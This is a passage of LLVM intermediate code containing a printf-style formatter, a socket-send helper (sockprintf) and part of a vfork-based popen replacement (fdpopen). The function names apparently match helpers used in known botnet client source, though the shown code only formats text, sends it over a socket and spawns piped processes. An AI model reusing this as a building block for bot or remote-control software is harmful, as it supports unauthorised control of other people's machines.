  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

; <label>:136:                                    ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

; <label>:141:                                    ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

; <label>:149:                                    ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

; <label>:154:                                    ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

; <label>:160:                                    ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

; <label>:166:                                    ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

; <label>:179:                                    ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

; <label>:196:                                    ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

; <label>:201:                                    ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

; <label>:209:                                    ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

; <label>:214:                                    ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

; <label>:220:                                    ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

; <label>:226:                                    ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

; <label>:239:                                    ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

; <label>:244:                                    ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

; <label>:249:                                    ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

; <label>:255:                                    ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

; <label>:260:                                    ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

; <label>:273:                                    ; preds = %239
  br label %282

; <label>:274:                                    ; preds = %17
  br label %275

; <label>:275:                                    ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %275, %273
  br label %283

; <label>:283:                                    ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12

; <label>:286:                                    ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

; <label>:289:                                    ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

; <label>:292:                                    ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.19, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %19

; <label>:14:                                     ; preds = %2
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  %18 = icmp ne i32 %17, 119
  br i1 %18, label %25, label %19

; <label>:19:                                     ; preds = %14, %2
  %20 = load i8*, i8** %5, align 8
  %21 = getelementptr inbounds i8, i8* %20, i64 1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  br i1 %24, label %25, label %26

; <label>:25:                                     ; preds = %19, %14
  store i32 -1, i32* %3, align 4
  br label %123

; <label>:26:                                     ; preds = %19
  %27 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %28 = call i32 @pipe(i32* %27) #2
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %30, label %31

; <label>:30:                                     ; preds = %26
  store i32 -1, i32* %3, align 4
  br label %123

; <label>:31:                                     ; preds = %26
  %32 = load i32*, i32** @fdopen_pids, align 8
  %33 = icmp eq i32* %32, null
  br i1 %33, label %34, label %54

; <label>:34:                                     ; preds = %31
  %35 = call i32 @getdtablesize() #2
  store i32 %35, i32* %8, align 4
  %36 = icmp sle i32 %35, 0
  br i1 %36, label %37, label %38

; <label>:37:                                     ; preds = %34
  store i32 -1, i32* %3, align 4
  br label %123

; <label>:38:                                     ; preds = %34
  %39 = load i32, i32* %8, align 4
  %40 = sext i32 %39 to i64
  %41 = mul i64 %40, 4
  %42 = trunc i64 %41 to i32
  %43 = zext i32 %42 to i64
  %44 = call noalias i8* @malloc(i64 %43) #2
  %45 = bitcast i8* %44 to i32*
  store i32* %45, i32** @fdopen_pids, align 8
  %46 = icmp eq i32* %45, null
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %38
  store i32 -1, i32* %3, align 4
  br label %123

; <label>:48:                                     ; preds = %38
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = bitcast i32* %49 to i8*
  %51 = load i32, i32* %8, align 4
  %52 = sext i32 %51 to i64
  %53 = mul i64 %52, 4
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 %53, i32 1, i1 false)
  br label %54

; <label>:54:                                     ; preds = %48, %31
  %55 = call i32 @vfork() #11
  store i32 %55, i32* %9, align 4
  switch i32 %55, label %99 [
    i32 -1, label %56
    i32 0, label %63
  ]

; <label>:56:                                     ; preds = %54
  %57 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @close(i32 %58)
  %60 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %61 = load i32, i32* %60, align 4
  %62 = call i32 @close(i32 %61)
  store i32 -1, i32* %3, align 4
  br label %123

; <label>:63:                                     ; preds = %54
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp eq i32 %66, 114
  br i1 %67, label %68, label %83

; <label>:68:                                     ; preds = %63
  %69 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %70 = load i32, i32* %69, align 4
  %71 = icmp ne i32 %70, 1
  br i1 %71, label %72, label %79

; <label>:72:                                     ; preds = %68
  %73 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %74 = load i32, i32* %73, align 4
  %75 = call i32 @dup2(i32 %74, i32 1) #2
  %76 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %77 = load i32, i32* %76, align 4
  %78 = call i32 @close(i32 %77)
  br label %79

; <label>:79:                                     ; preds = %72, %68
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @close(i32 %81)
  br label %98

; <label>:83:                                     ; preds = %63
  %84 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %85 = load i32, i32* %84, align 4
  %86 = icmp ne i32 %85, 0
  br i1 %86, label %87, label %94

; <label>:87:                                     ; preds = %83
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @dup2(i32 %89, i32 0) #2
  %91 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %92 = load i32, i32* %91, align 4
  %93 = call i32 @close(i32 %92)
  br label %94

; <label>:94:                                     ; preds = %87, %83
  %95 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %96 = load i32, i32* %95, align 4
  %97 = call i32 @close(i32 %96)
  br label %98

; <label>:98:                                     ; preds = %94, %79
  call void @_exit(i32 127) #12
  unreachable

; <label>:99:                                     ; preds = %54
  %100 = load i8*, i8** %5, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 114
  br i1 %103, label %104, label %110

; <label>:104:                                    ; preds = %99
  %105 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %106 = load i32, i32* %105, align 4
  store i32 %106, i32* %6, align 4
  %107 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %108 = load i32, i32* %107, align 4
  %109 = call i32 @close(i32 %108)
  br label %116

; <label>:110:                                    ; preds = %99
  %111 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %112 = load i32, i32* %111, align 4
  store i32 %112, i32* %6, align 4
  %113 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %114 = load i32, i32* %113, align 4
  %115 = call i32 @close(i32 %114)
